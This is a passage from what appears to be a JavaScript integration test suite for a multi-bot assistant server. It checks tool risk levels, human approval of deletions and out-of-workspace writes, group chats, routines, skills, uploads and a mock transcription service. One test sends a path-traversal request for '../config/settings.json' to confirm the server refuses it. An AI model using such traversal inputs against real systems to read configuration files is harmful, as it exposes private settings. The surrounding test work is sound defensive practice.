    turnId: 'turn_tool_test',
    unattended: false,
    depth: 0,
    emit: () => {},
    bots: {
      listBots: botsMod.listBots,
      getBot: botsMod.getBot,
      createBot: botsMod.createBot,
      updateBot: botsMod.updateBot,
      deleteBot: botsMod.deleteBot,
    },
    groups: groupsMod,
  });
  const ctx = await toolCtx('chief');

  // --- risk declarations: the approval boundary must stay honest -----------
  checkEqual('bot_delete is declared HIGH risk', registry.get('bot_delete').risk, 'HIGH');
  check(
    'bot_create, bot_update and group_create are MEDIUM risk',
    ['bot_create', 'bot_update', 'group_create'].every((name) => registry.get(name).risk === 'MEDIUM'),
  );
  checkEqual('group_post is LOW risk', registry.get('group_post').risk, 'LOW');

  const deleteAsk = approvals.classify('bot_delete', { id: 'ops' }, {
    baseRisk: registry.get('bot_delete').risk,
    granted: true,
    // Even a bot that auto-approves medium work must stop for a deletion.
    autoApproveMedium: true,
  });
  check('bot_delete always asks a human', deleteAsk.decision === 'ask' && deleteAsk.risk === 'HIGH', JSON.stringify(deleteAsk));

  const createAsk = approvals.classify('bot_create', { name: 'X' }, {
    baseRisk: registry.get('bot_create').risk,
    granted: true,
    autoApproveMedium: false,
  });
  check('bot_create asks a human under the default policy', createAsk.decision === 'ask', JSON.stringify(createAsk));

  const createDenied = approvals.classify('bot_create', { name: 'X' }, {
    baseRisk: registry.get('bot_create').risk,
    granted: false,
    autoApproveMedium: true,
  });
  check('a bot without the grant is denied outright, not asked', createDenied.decision === 'deny', JSON.stringify(createDenied));

  // --- the seeded grants are exactly what the Lead asked for ----------------
  const roster = (await api('/api/bots')).json;
  const chief = roster.find((b) => b.id === 'chief');
  const researcher = roster.find((b) => b.id === 'researcher');
  const ops = roster.find((b) => b.id === 'ops');
  check(
    'chief is granted roster management plus group voice',
    ['bot_create', 'bot_update', 'bot_delete', 'group_create', 'group_post'].every((name) => chief.tools.includes(name)),
    JSON.stringify(chief.tools),
  );
  check(
    'specialists may speak in groups but cannot manage the roster',
    researcher.tools.includes('group_post') &&
      ops.tools.includes('group_post') &&
      !researcher.tools.includes('bot_create') &&
      !ops.tools.includes('bot_create') &&
      !researcher.tools.includes('bot_delete') &&
      !ops.tools.includes('bot_delete') &&
      !researcher.tools.includes('group_create') &&
      !ops.tools.includes('group_create'),
    JSON.stringify({ researcher: researcher.tools, ops: ops.tools }),
  );
  check(
    'the model-facing tool schema follows the grants',
    registry.schemasFor(chief).some((s) => s.function.name === 'bot_create') &&
      registry.schemasFor(researcher).some((s) => s.function.name === 'group_post') &&
      !registry.schemasFor(researcher).some((s) => s.function.name === 'bot_delete'),
  );
  const plainBot = { id: 'plain', tools: [] };
  const plainDenied = approvals.classify('group_post', { group: 'x', text: 'hi' }, {
    baseRisk: registry.get('group_post').risk,
    granted: registry.isGranted(plainBot, 'group_post'),
    autoApproveMedium: true,
  });
  check(
    'a bot without group_post gets the normal not-granted denial',
    registry.isGranted(plainBot, 'group_post') === false && plainDenied.decision === 'deny',
    JSON.stringify(plainDenied),
  );

  // --- create ---------------------------------------------------------------
  const created = await registry.get('bot_create').run(
    { name: 'Note Keeper', role: 'keeps the notes', tools: ['fs_read'] },
    ctx,
  );
  check('bot_create creates a bot', created?.created === true && created?.bot?.id === 'note-keeper', JSON.stringify(created));
  const afterCreate = (await api('/api/bots')).json.find((b) => b.id === 'note-keeper');
  check(
    'the new bot appears in GET /api/bots with its role and grants',
    afterCreate?.role === 'keeps the notes' && afterCreate.tools.includes('fs_read'),
    JSON.stringify(afterCreate),
  );
  const duplicate = await errorCode(() => registry.get('bot_create').run({ name: 'Note Keeper' }, ctx));
  checkEqual('creating the same bot twice is refused', duplicate, 'BOT_EXISTS');

  // --- update ---------------------------------------------------------------
  const updated = await registry.get('bot_update').run(
    { id: 'note-keeper', name: 'Note Archivist', role: 'archives the notes' },
    ctx,
  );
  check(
    'bot_update changes name and role',
    updated?.bot?.name === 'Note Archivist' && updated?.bot?.role === 'archives the notes',
    JSON.stringify(updated),
  );
  const afterUpdate = (await api('/api/bots')).json.find((b) => b.id === 'note-keeper');
  check('the rename is visible over HTTP', afterUpdate?.name === 'Note Archivist', afterUpdate?.name);
  const nothing = await errorCode(() => registry.get('bot_update').run({ id: 'note-keeper' }, ctx));
  checkEqual('bot_update with no fields is refused', nothing, 'BOT_NOTHING_TO_UPDATE');

  // --- delete, including the primary guard ---------------------------------
  const protectedError = await errorCode(() => registry.get('bot_delete').run({ id: 'chief' }, ctx));
  checkEqual('bot_delete refuses the primary bot', protectedError, 'BOT_PRIMARY_PROTECTED');
  check('the primary bot is still on the roster', (await api('/api/bots')).json.some((b) => b.id === 'chief'));

  const deleted = await registry.get('bot_delete').run({ id: 'note-keeper' }, ctx);
  check('bot_delete removes the bot', deleted?.deleted === true, JSON.stringify(deleted));
  check('the deleted bot is gone from GET /api/bots', !(await api('/api/bots')).json.some((b) => b.id === 'note-keeper'));

  // --- group_create validation through the tool -----------------------------
  const oneMember = await errorCode(() => registry.get('group_create').run({ name: 'Too Small', members: ['chief'] }, ctx));
  checkEqual('group_create rejects one member', oneMember, 'GROUP_MEMBER_COUNT');
  const sevenMembers = await errorCode(() =>
    registry.get('group_create').run({ name: 'Too Big', members: ['a', 'b', 'c', 'd', 'e', 'f', 'g'] }, ctx),
  );
  checkEqual('group_create rejects seven members', sevenMembers, 'GROUP_MEMBER_COUNT');
  const badCoordinator = await errorCode(() =>
    registry.get('group_create').run({ name: 'Bad Chair', members: ['chief', 'researcher'], coordinator: 'ops' }, ctx),
  );
  checkEqual('group_create requires the coordinator to be a member', badCoordinator, 'GROUP_BAD_COORDINATOR');
  const unknownMember = await errorCode(() =>
    registry.get('group_create').run({ name: 'Ghosts', members: ['chief', 'ghost-bot'] }, ctx),
  );
  checkEqual('group_create rejects unknown members', unknownMember, 'GROUP_UNKNOWN_MEMBER');

  const createdGroup = await registry.get('group_create').run({ name: 'Ops Room', members: ['chief', 'ops'] }, ctx);
  check(
    'group_create creates a 2-member group and defaults the coordinator to the first member',
    createdGroup?.created === true &&
      createdGroup?.group?.members?.length === 2 &&
      createdGroup?.group?.coordinatorId === 'chief',
    JSON.stringify(createdGroup),
  );
  const opsRoom = (await api('/api/groups')).json.find((g) => g.id === createdGroup?.group?.id);
  check('the tool-created group appears in GET /api/groups', Boolean(opsRoom) && opsRoom.members.length === 2);
  await api(`/api/groups/${createdGroup.group.id}`, { method: 'DELETE' });
}

// ---------------------------------------------------------------------------
// group chats (API + one real coordinator turn under the mock provider)
// ---------------------------------------------------------------------------

async function scenarioGroups({ botsMod, groupsMod, toolsMod }) {
  const workspaceDir = path.join(home, 'workspace');
  const registry = toolsMod.createRegistry({
    workspaceDir,
    config: {},
    getRuntime: () => {
      throw new Error('group tools never start turns');
    },
    getRoutines: () => {
      throw new Error('group tools never run routines');
    },
  });
  const toolCtx = async (botId) => ({
    bot: await botsMod.getBot(botId),
    config: await botsMod.loadAssistantConfig(),
    workspaceDir,
    turnId: 'turn_group_tool_test',
    unattended: false,
    depth: 0,
    emit: () => {},
    bots: {
      listBots: botsMod.listBots,
      getBot: botsMod.getBot,
      createBot: botsMod.createBot,
      updateBot: botsMod.updateBot,
      deleteBot: botsMod.deleteBot,
    },
    groups: groupsMod,
  });

  // A coordinator bot with the group tools, so this scenario does not depend on
  // the seed roster's grants.
  await api('/api/bots', {
    method: 'POST',
    body: { name: 'Steward', role: 'runs group turns', tools: ['bot_list', 'bot_message', 'group_post', 'task_finish'] },
  });

  // --- member-count and coordinator validation ------------------------------
  const oneMember = await api('/api/groups', { method: 'POST', body: { name: 'Solo', members: ['steward'] } });
  check(
    'POST /api/groups rejects a one-member group',
    oneMember.status === 400 && oneMember.json?.error?.code === 'GROUP_MEMBER_COUNT',
    oneMember.text,
  );
  const sevenMembers = await api('/api/groups', {
    method: 'POST',
    body: { name: 'Crowd', members: ['a', 'b', 'c', 'd', 'e', 'f', 'g'] },
  });
  check(
    'POST /api/groups rejects a seven-member group',
    sevenMembers.status === 400 && sevenMembers.json?.error?.code === 'GROUP_MEMBER_COUNT',
    sevenMembers.text,
  );
  const badCoordinator = await api('/api/groups', {
    method: 'POST',
    body: { name: 'Bad Chair', members: ['steward', 'researcher'], coordinatorId: 'ops' },
  });
  check(
    'POST /api/groups requires the coordinator to be a member',
    badCoordinator.status === 400 && badCoordinator.json?.error?.code === 'GROUP_BAD_COORDINATOR',
    badCoordinator.text,
  );
  const unknownMember = await api('/api/groups', {
    method: 'POST',
    body: { name: 'Ghosts', members: ['steward', 'ghost-bot'] },
  });
  check(
    'POST /api/groups rejects unknown members',
    unknownMember.status === 400 && unknownMember.json?.error?.code === 'GROUP_UNKNOWN_MEMBER',
    unknownMember.text,
  );

  // --- create + list --------------------------------------------------------
  const created = await api('/api/groups', {
    method: 'POST',
    body: { name: 'Release Room', members: ['steward', 'researcher', 'ops'], coordinatorId: 'steward' },
  });
  const groupId = created.json?.group?.id;
  check(
    'POST /api/groups creates a group',
    created.status === 200 && created.json?.group?.members?.length === 3 && created.json.group.coordinatorId === 'steward',
    created.text,
  );
  check(
    'group members are projected to objects with id, name, role and avatar',
    created.json?.group?.members?.every((m) => m.id && m.name && typeof m.role === 'string' && m.avatar?.shape),
    JSON.stringify(created.json?.group?.members),
  );
  const listed = await api('/api/groups');
  const listedGroup = listed.json.find((g) => g.id === groupId);
  check('GET /api/groups lists the group with preview:null', Boolean(listedGroup) && listedGroup.preview === null, listed.text.slice(0, 240));
  const single = await api(`/api/groups/${groupId}`);
  check(
    'GET /api/groups/:id returns the same group',
    single.status === 200 && single.json?.group?.id === groupId && single.json.group.members.length === 3,
    single.text.slice(0, 200),
  );

  // --- patch ----------------------------------------------------------------
  const renamed = await api(`/api/groups/${groupId}`, { method: 'PATCH', body: { name: 'Release Room 2' } });
  check('PATCH /api/groups renames the group', renamed.json?.group?.name === 'Release Room 2', renamed.text);
  const badPatch = await api(`/api/groups/${groupId}`, { method: 'PATCH', body: { coordinatorId: 'chief' } });
  check(
    'PATCH rejects a coordinator who is not a member',
    badPatch.status === 400 && badPatch.json?.error?.code === 'GROUP_BAD_COORDINATOR',
    badPatch.text,
  );
  const dropped = await api(`/api/groups/${groupId}`, { method: 'PATCH', body: { members: ['steward', 'researcher'] } });
  check(
    'PATCH can drop a member',
    dropped.json?.group?.members?.map((m) => m.id).join(',') === 'steward,researcher',
    dropped.text,
  );
  const twin = await api('/api/groups', { method: 'POST', body: { name: 'Release Room', members: ['steward', 'ops'] } });
  check(
    'a second group with the same name gets its own id',
    twin.status === 200 && Boolean(twin.json?.group?.id) && twin.json.group.id !== groupId,
    twin.text.slice(0, 200),
  );
  await api(`/api/groups/${twin.json.group.id}`, { method: 'DELETE' });

  // --- a real group turn: POST -> SSE -> transcript -------------------------
  const stream = await openStream('', { groupId });
  let posted;
  let end;
  try {
    posted = await api(`/api/groups/${groupId}/message`, {
      method: 'POST',
      body: { text: '大家好，先对一下今天的进度。' },
    });
    check('POST /api/groups/:id/message returns a turnId', posted.status === 200 && Boolean(posted.json?.turnId), posted.text);
    end = await stream.waitFor(
      (event) => event.type === 'turn.end' && event.turnId === posted.json.turnId,
      20000,
      'group turn.end',
    );
    check('the coordinator turn completes', end.status === 'success', end.status);
  } finally {
    stream.close();
  }
  const turnEvents = stream.events.filter((event) => event.turnId === posted.json.turnId);
  check('the group turn streamed events', turnEvents.length > 1, `${turnEvents.length} events`);
  check('every event on a ?groupId stream carries that groupId', stream.events.length > 0 && stream.events.every((e) => e.groupId === groupId));
  const postedEvent = stream.events.find((event) => event.type === 'group.message' && event.message?.from === 'steward');
  check('SSE carries a group.message posted by the coordinator', Boolean(postedEvent), JSON.stringify(stream.events.map((e) => e.type)));

  const transcript = await api(`/api/groups/${groupId}/messages`);
  const items = transcript.json;
  check(
    'the transcript starts with the human message',
    items[0]?.kind === 'user' && items[0]?.from === 'user' && items[0]?.text === '大家好，先对一下今天的进度。',
    JSON.stringify(items[0]),
  );
  check(
    'the transcript contains an assistant reply from the coordinator',
    items.some((m) => m.kind === 'assistant' && m.from === 'steward' && typeof m.text === 'string' && m.text.length > 0),
    JSON.stringify(items.map((m) => [m.kind, m.from])),
  );
  check(
    'the group_post tool call is visible as a tool row',
    items.some((m) => m.kind === 'tool' && m.name === 'group_post'),
    JSON.stringify(items.filter((m) => m.kind === 'tool')),
  );
  check(
    'the coordinator pulled a teammate in with bot_message',
    items.some((m) => m.kind === 'tool' && m.name === 'bot_message'),
    JSON.stringify(items.filter((m) => m.kind === 'tool').map((m) => m.name)),
  );
  check(
    'the teammate answered in the group itself, not only privately',
    items.some((m) => m.kind === 'assistant' && m.from === 'researcher'),
    JSON.stringify(items.map((m) => [m.kind, m.from])),
  );
  check(
    'the teammate speaking is streamed to the group',
    stream.events.some((event) => event.type === 'group.message' && event.message?.from === 'researcher'),
    JSON.stringify(stream.events.filter((e) => e.type === 'group.message').map((e) => e.message?.from)),
  );
  check(
    'the transcript ends with a status row for the turn',
    items.at(-1)?.kind === 'status' && items.at(-1)?.status === 'success',
    JSON.stringify(items.at(-1)),
  );
  check('every transcript row has an id and an ISO timestamp', items.every((m) => typeof m.id === 'string' && !Number.isNaN(Date.parse(m.ts))));
  check(
    'the transcript text is the exact text the coordinator posted',
    postedEvent ? items.find((m) => m.id === postedEvent.message.id)?.text === postedEvent.message.text : false,
  );

  const groupLog = await fsp.readFile(path.join(home, 'data', 'groups', `${groupId}.jsonl`), 'utf8');
  check(
    'group messages are appended to data/groups/<id>.jsonl',
    groupLog.split('\n').filter(Boolean).length === items.length && groupLog.includes('"kind":"assistant"') && groupLog.includes('group_post'),
    `${groupLog.split('\n').filter(Boolean).length} lines`,
  );

  const afterTurn = (await api('/api/groups')).json.find((g) => g.id === groupId);
  const lastMeaningful = [...items].reverse().find((m) => m.kind === 'user' || m.kind === 'assistant');
  const expectedPreview = lastMeaningful
    ? {
        text: Array.from(String(lastMeaningful.text).replace(/\s+/g, ' ').trim()).slice(0, 120).join(''),
        ts: lastMeaningful.ts,
        from: lastMeaningful.from,
      }
    : null;
  checkEqual('the group preview is the last meaningful message', afterTurn?.preview, expectedPreview);
  check(
    'the group preview names a real sender',
    afterTurn?.preview?.from === 'steward' || afterTurn?.preview?.from === 'researcher',
    JSON.stringify(afterTurn?.preview),
  );

  // --- a member can speak in the group; a non-member cannot ----------------
  const memberCtx = await toolCtx('researcher');
  const memberPost = await registry
    .get('group_post')
    .run({ group: groupId, text: 'Researcher here: sources checked, digest written.' }, memberCtx);
  check('a member bot can post with group_post', memberPost?.posted === true, JSON.stringify(memberPost));
  const afterMember = await api(`/api/groups/${groupId}/messages`);
  check(
    'the member message lands in the transcript attributed to it',
    afterMember.json.some(
      (m) => m.kind === 'assistant' && m.from === 'researcher' && m.text.includes('Researcher here'),
    ),
  );
  const outsiderCtx = await toolCtx('ops');
  const outsider = await errorCode(() =>
    registry.get('group_post').run({ group: groupId, text: 'should not land' }, outsiderCtx),
  );
  checkEqual('a non-member cannot post in the group', outsider, 'GROUP_MEMBER_REQUIRED');
  check(
    'the refused post left no trace',
    !(await api(`/api/groups/${groupId}/messages`)).json.some((m) => m.text === 'should not land'),
  );

  // --- deleting a bot repairs the groups it sat in -------------------------
  await api('/api/bots', { method: 'POST', body: { name: 'Temp Chair', role: 'temporary', tools: ['group_post'] } });
  const repairGroup = await api('/api/groups', {
    method: 'POST',
    body: { name: 'Repair Room', members: ['temp-chair', 'steward', 'researcher'], coordinatorId: 'temp-chair' },
  });
  const repairId = repairGroup.json?.group?.id;
  const seatsBefore = repairGroup.json?.group?.members?.map((m) => m.id).join(',');
  const removal = await api('/api/bots/temp-chair', { method: 'DELETE' });
  check(
    'DELETE /api/bots reports the groups it repaired',
    removal.json?.groupsRepaired?.some((g) => g.id === repairId),
    JSON.stringify(removal.json?.groupsRepaired),
  );
  const repaired = (await api('/api/groups')).json.find((g) => g.id === repairId);
  check(
    'the deleted bot left the group roster',
    repaired?.members?.every((m) => m.id !== 'temp-chair') && repaired?.members?.length === 2,
    `${seatsBefore} -> ${repaired?.members?.map((m) => m.id).join(',')}`,
  );
  check('a coordinator seat is promoted to a remaining member', repaired?.coordinatorId === 'steward', repaired?.coordinatorId);
  await api(`/api/groups/${repairId}`, { method: 'DELETE' });

  // --- a group that drops below two members keeps an honest state ----------
  await api('/api/bots', { method: 'POST', body: { name: 'Solo Member', role: 'temporary' } });
  const tiny = await api('/api/groups', { method: 'POST', body: { name: 'Tiny Room', members: ['steward', 'solo-member'] } });
  const tinyId = tiny.json?.group?.id;
  await api('/api/bots/solo-member', { method: 'DELETE' });
  const tinyAfter = (await api('/api/groups')).json.find((g) => g.id === tinyId);
  check(
    'a group that lost a member keeps the remaining one',
    tinyAfter?.members?.length === 1 && tinyAfter.members[0].id === 'steward',
    JSON.stringify(tinyAfter?.members),
  );
  const blocked = await api(`/api/groups/${tinyId}/message`, { method: 'POST', body: { text: 'anyone there?' } });
  check(
    'a one-member group refuses to run with GROUP_TOO_SMALL',
    blocked.status === 409 && blocked.json?.error?.code === 'GROUP_TOO_SMALL',
    blocked.text,
  );
  const revived = await api(`/api/groups/${tinyId}`, { method: 'PATCH', body: { members: ['steward', 'researcher'] } });
  check('PATCH can revive a group by adding a member', revived.status === 200 && revived.json?.group?.members?.length === 2, revived.text);
  await api(`/api/groups/${tinyId}`, { method: 'DELETE' });

  // --- delete the group -----------------------------------------------------
  const removedGroup = await api(`/api/groups/${groupId}`, { method: 'DELETE' });
  check(
    'DELETE /api/groups/:id deletes the group',
    removedGroup.status === 200 && removedGroup.json?.ok === true && removedGroup.json?.deleted === true,
    removedGroup.text,
  );
  const goneMessages = await api(`/api/groups/${groupId}/messages`);
  check(
    'a deleted group has no transcript endpoint',
    goneMessages.status === 404 && goneMessages.json?.error?.code === 'GROUP_NOT_FOUND',
    goneMessages.text,
  );
  const transcriptStillThere = await fsp
    .stat(path.join(home, 'data', 'groups', `${groupId}.jsonl`))
    .then(() => true)
    .catch(() => false);
  check('the transcript file is removed with the group', transcriptStillThere === false);
  check('an unknown group is a 404', (await api('/api/groups/nope')).status === 404);

  // --- cleanup --------------------------------------------------------------
  await api('/api/bots/steward', { method: 'DELETE' });
  const remaining = (await api('/api/bots')).json.map((b) => b.id).sort().join(',');
  check('the group test bots are cleaned up', remaining === 'chief,ops,researcher', remaining);
}

async function scenarioChiefTurn() {
  const stream = await openStream('chief');
  let turn;
  try {
    turn = await runTurn('chief', 'List the files in the workspace and write a note', stream);
  } finally {
    stream.close();
  }

  check('chief turn completes', turn.status === 'success', turn.status);
  const types = new Set(turn.events.map((e) => e.type));
  for (const type of ['turn.start', 'tool.call', 'tool.result', 'message', 'turn.end']) {
    check(`SSE emitted ${type}`, types.has(type), [...types].join(','));
  }
  const toolNames = turn.events.filter((e) => e.type === 'tool.call').map((e) => e.name);
  check('chief called fs_list then fs_write then memory_write', ['fs_list', 'fs_write', 'memory_write'].every((n) => toolNames.includes(n)), toolNames.join(','));
  const deltas = turn.events.filter((e) => e.type === 'message.delta');
  check('assistant text was streamed as deltas', deltas.length >= 1);

  const planFile = path.join(home, 'workspace', 'notes', 'plan.md');
  const wrote = await fsp.readFile(planFile, 'utf8').catch(() => null);
  check('fs_write created workspace/notes/plan.md on disk', Boolean(wrote) && wrote.includes('# Plan'), String(wrote).slice(0, 60));

  const memFile = path.join(home, 'data', 'memory', 'chief', 'MEMORY.md');
  const mem = await fsp.readFile(memFile, 'utf8').catch(() => '');
  check('memory_write appended to the per-bot MEMORY.md', mem.includes('workspace sweep'), mem.slice(-120));

  const memoryApi = await api('/api/bots/chief/memory');
  check('GET /api/bots/:id/memory returns entries', memoryApi.status === 200 && memoryApi.json.entries.length >= 1);

  const messages = await api('/api/bots/chief/messages');
  const roles = new Set(messages.json.map((m) => m.role));
  check('message log has user, tool and assistant items', ['user', 'tool', 'assistant'].every((r) => roles.has(r)), [...roles].join(','));
  check('tool chips carry a risk classification', messages.json.filter((m) => m.role === 'tool').every((m) => typeof m.risk === 'string' && m.risk.length > 0));

  const audit = await api('/api/audit?limit=100');
  check('audit log records tool runs', audit.status === 200 && audit.json.some((a) => a.kind === 'tool.run'));
}

async function scenarioHandoff() {
  const stream = await openStream('chief');
  let turn;
  try {
    turn = await runTurn('chief', 'Hand off to the researcher: summarise welcome.md for me', stream);
  } finally {
    stream.close();
  }

  check('handoff turn completes', turn.status === 'success', turn.status);
  const messageCall = turn.events.find((e) => e.type === 'tool.call' && e.name === 'bot_message');
  check('chief used bot_message to hand off', Boolean(messageCall), turn.events.map((e) => e.name).join(','));
  const messageResult = turn.events.find((e) => e.type === 'tool.result' && e.name === 'bot_message');
  check(
    'the researcher actually ran and replied',
    messageResult?.result?.status === 'success' && String(messageResult?.result?.reply || '').length > 0,
    JSON.stringify(messageResult?.result || {}).slice(0, 160),
  );

  const researcherMessages = await api('/api/bots/researcher/messages');
  check('researcher kept its own separate conversation', researcherMessages.json.some((m) => m.role === 'tool' && m.name === 'fs_read'));
}

async function scenarioApprovalApprove() {
  const stream = await openStream('ops');
  try {
    const post = await api('/api/bots/ops/message', {
      method: 'POST',
      body: { text: 'Write a note outside the workspace: alpha' },
    });
    check('ops message accepted', post.status === 200 && Boolean(post.json.turnId), post.text);

    const request = await stream.waitFor((e) => e.type === 'approval.request', 10000, 'approval.request');
    check('writing outside the workspace raised an approval card', request.risk === 'HIGH', request.risk);

    const pending = await api('/api/approvals?status=pending');
    const card = pending.json.find((a) => a.id === request.approvalId);
    check('GET /api/approvals?status=pending lists the card', Boolean(card), pending.text.slice(0, 200));
    check('approval card carries tool, args and reason', Boolean(card?.toolName) && Boolean(card?.args) && Boolean(card?.reason));

    const decision = await api(`/api/approvals/${request.approvalId}`, {
      method: 'POST',
      body: { decision: 'approve', note: 'smoke test' },
    });
    check('POST /api/approvals/:id approves', decision.status === 200 && decision.json.approval.status === 'approved');

    const end = await stream.waitFor((e) => e.type === 'turn.end' && e.turnId === post.json.turnId, 15000, 'turn.end after approval');
    check('turn resumes and finishes after approval', end.status === 'success', end.status);

    const outside = path.join(home, 'outside-note.md');
    const content = await fsp.readFile(outside, 'utf8').catch(() => '');
    check('approved write landed outside the workspace', content.includes('alpha'), content.slice(0, 80));

    const audit = await api('/api/audit?limit=200');
    check(
      'audit log records the approval decision',
      audit.json.some((a) => a.kind === 'approval.resolved' && a.status === 'approved'),
    );
  } finally {
    stream.close();
  }
}

async function scenarioApprovalDeny() {
  const stream = await openStream('ops');
  try {
    const post = await api('/api/bots/ops/message', {
      method: 'POST',
      body: { text: 'Write a note outside the workspace: beta' },
    });
    const request = await stream.waitFor((e) => e.type === 'approval.request', 10000, 'second approval.request');

    const decision = await api(`/api/approvals/${request.approvalId}`, {
      method: 'POST',
      body: { decision: 'deny', note: 'not now' },
    });
    check('deny is recorded', decision.status === 200 && decision.json.approval.status === 'denied');

    const end = await stream.waitFor((e) => e.type === 'turn.end' && e.turnId === post.json.turnId, 10000, 'turn.end after deny');
    check('denied tool does not fail the whole turn', end.status === 'success', end.status);

    const anyDenied = stream.events.some((e) => e.type === 'tool.result' && e.result?.error?.code === 'APPROVAL_DENIED');
    check('tool result reports APPROVAL_DENIED back to the model', anyDenied, 'no APPROVAL_DENIED result');

    const outside = await fsp.readFile(path.join(home, 'outside-note.md'), 'utf8').catch(() => '');
    check('denied write did NOT touch the file', !outside.includes('beta'), outside.slice(0, 80));

    const audit = await api('/api/audit?limit=200');
    check('audit log records the denial', audit.json.some((a) => a.kind === 'approval.resolved' && a.status === 'denied'));
  } finally {
    stream.close();
  }
}

async function scenarioRoutineNeedsApproval() {
  const created = await api('/api/routines', {
    method: 'POST',
    body: {
      botId: 'ops',
      name: 'Nightly outside write',
      instruction: 'Write a note outside the workspace: gamma',
      schedule: 'every 60 minutes',
      enabled: true,
    },
  });
  check('POST /api/routines creates a routine', created.status === 200 && Boolean(created.json.routine.id), created.text);
  const routineId = created.json.routine.id;
  check('routine has a computed nextRun', Boolean(created.json.routine.nextRun), JSON.stringify(created.json.routine));
  check('routine stores its timezone', Boolean(created.json.routine.timezone));

  const tested = await api(`/api/routines/${routineId}/test`, { method: 'POST', body: {} });
  check('POST /api/routines/:id/test runs immediately', tested.status === 200 && Boolean(tested.json.run));
  check(
    'unattended run stops as needs_approval instead of hanging',
    tested.json?.run?.status === 'needs_approval',
    JSON.stringify(tested.json?.run || {}).slice(0, 200),
  );

  const opsMessages = await api('/api/bots/ops/messages');
  check(
    'chat explains that the routine is paused for approval',
    opsMessages.json.some((m) => String(m.text || '').toLowerCase().includes('paused')),
  );

  const list = await api('/api/routines');
  const listed = list.json.find((r) => r.id === routineId);
  check('routine history records the needs_approval run', listed?.runs?.some((r) => r.status === 'needs_approval'));

  const disabled = await api(`/api/routines/${routineId}`, { method: 'PATCH', body: { enabled: false } });
  check('PATCH /api/routines/:id can disable it', disabled.status === 200 && disabled.json.routine.enabled === false);
  check('a disabled routine has no nextRun', !disabled.json.routine.nextRun);

  const removed = await api(`/api/routines/${routineId}`, { method: 'DELETE' });
  check('DELETE /api/routines/:id removes it', removed.status === 200);
}

async function scenarioRoutineSuccess() {
  const created = await api('/api/routines', {
    method: 'POST',
    body: {
      botId: 'chief',
      name: 'Morning read',
      instruction: 'Read welcome.md and summarise it',
      schedule: '0 9 * * 1-5',
      timezone: 'Asia/Shanghai',
      enabled: true,
    },
  });
  check('cron-scheduled routine accepted', created.status === 200 && created.json.routine.kind === 'cron', created.text);
  const next = new Date(created.json.routine.nextRun);
  check('cron nextRun is a real future instant', next instanceof Date && next.getTime() > Date.now());

  const tested = await api(`/api/routines/${created.json.routine.id}/test`, { method: 'POST', body: {} });
  check('a safe routine test succeeds', tested.json?.run?.status === 'success', JSON.stringify(tested.json?.run || {}).slice(0, 200));
  check('test run is appended to history', tested.json?.routine?.runs?.length >= 1);
}

async function scenarioSkillSaveViaBot() {
  const before = await api('/api/skills');
  check('GET /api/skills lists the 4 starter skills', before.status === 200 && before.json.length >= 4, `got ${before.json?.length}`);
  check(
    'skills expose frontmatter fields',
    before.json.every((s) => s.name && s.description && Array.isArray(s.steps) && s.validation && s.approval_notes),
  );

  const one = await api('/api/skills/workspace-sweep');
  check('GET /api/skills/:name returns steps', one.status === 200 && one.json.skill.steps.length >= 3, one.text.slice(0, 120));

  const stream = await openStream('researcher');
  try {
    const turn = await runTurn('researcher', 'Save this as a skill called inbox-triage: sort the inbox and write top three', stream);
    check('researcher turn completes', turn.status === 'success', turn.status);
    const saveCall = turn.events.find((e) => e.type === 'tool.call' && e.name === 'skill_save');
    check('skill_save was called', Boolean(saveCall));
    check('skill_save is MEDIUM risk', saveCall?.risk === 'MEDIUM', saveCall?.risk);
    check('researcher auto-approved MEDIUM without a card', saveCall?.decision === 'auto', saveCall?.decision);
  } finally {
    stream.close();
  }

  const after = await api('/api/skills');
  check('new skill appears in the shared library', after.json.some((s) => s.slug === 'inbox-triage'), after.json.map((s) => s.slug).join(','));
  const saved = await api('/api/skills/inbox-triage');
  check('saved skill has the required frontmatter', saved.status === 200 && saved.json.skill.steps.length >= 3 && Boolean(saved.json.skill.approval_notes));
}

async function scenarioAttachmentsAndVoice() {
  // Attachments: upload, read back, reference in a message.
  const up = await fetch(`${base}/api/uploads`, {
    method: 'POST',
    headers: { 'content-type': 'text/plain', 'x-file-name': encodeURIComponent('笔记.txt') },
    body: 'hello attachment',
  });
  const upJson = await up.json();
  check('upload: stored under uploads/<date>/', up.ok && /^uploads\/\d{4}-\d{2}-\d{2}\/笔记\.txt$/.test(upJson.path), JSON.stringify(upJson));
  const back = await fetch(`${base}/api/workspace/file?path=${encodeURIComponent(upJson.path)}`);
  check('upload: reads back as a download', back.ok && (await back.text()) === 'hello attachment' && /attachment/.test(back.headers.get('content-disposition') || ''));
  const outside = await fetch(`${base}/api/workspace/file?path=${encodeURIComponent('../config/settings.json')}`);
  check('workspace file: refuses paths outside the workspace', outside.status === 400);
  const fake = await api('/api/bots/chief/message', { method: 'POST', body: { text: 'hi', attachments: [{ path: 'config/settings.json' }] } });
  check('message: only uploaded files can be attached', fake.status === 400 && fake.json?.error?.code === 'BAD_ATTACHMENT');

  // Voice: a fake OpenAI-compatible /audio/transcriptions.
  const seen = [];
  const stt = http.createServer((req, res) => {
    const chunks = [];
    req.on('data', (c) => chunks.push(c));
    req.on('end', () => {
      const body = Buffer.concat(chunks).toString('latin1');
      seen.push({ url: req.url, auth: req.headers.authorization, type: req.headers['content-type'], body });
      if (req.headers.authorization !== 'Bearer voice-key') { res.writeHead(401, { 'content-type': 'application/json' }); res.end('{"error":{"message":"bad key"}}'); return; }
      res.writeHead(200, { 'content-type': 'application/json' });
      res.end(JSON.stringify({ text: '<|zh|><|NEUTRAL|>帮我看看磁盘' }));
    });
  });
  await new Promise((r) => stt.listen(0, '127.0.0.1', r));
  try {
    const before = await api('/api/voice');
    check('voice: mock chat provider means not available yet', before.status === 200 && before.json.available === false && before.json.hasKey === false);
    const notReady = await fetch(`${base}/api/voice/transcribe`, { method: 'POST', headers: { 'content-type': 'audio/webm' }, body: Buffer.from('abc') });
    check('voice: transcribe without a service says so', notReady.status === 409);
    const sttUrl = `http://127.0.0.1:${stt.address().port}/v1`;
    const saved = await api('/api/voice', { method: 'PUT', body: { baseUrl: sttUrl, model: 'stt-1', apiKey: 'voice-key' } });
    check('voice: own settings make it available, key never returned', saved.status === 200 && saved.json.available && saved.json.source === 'own' && saved.json.hasKey && !JSON.stringify(saved.json).includes('voice-key'));
    const tr = await fetch(`${base}/api/voice/transcribe`, { method: 'POST', headers: { 'content-type': 'audio/webm;codecs=opus' }, body: Buffer.from('fake-opus-bytes') });
    const trJson = await tr.json();
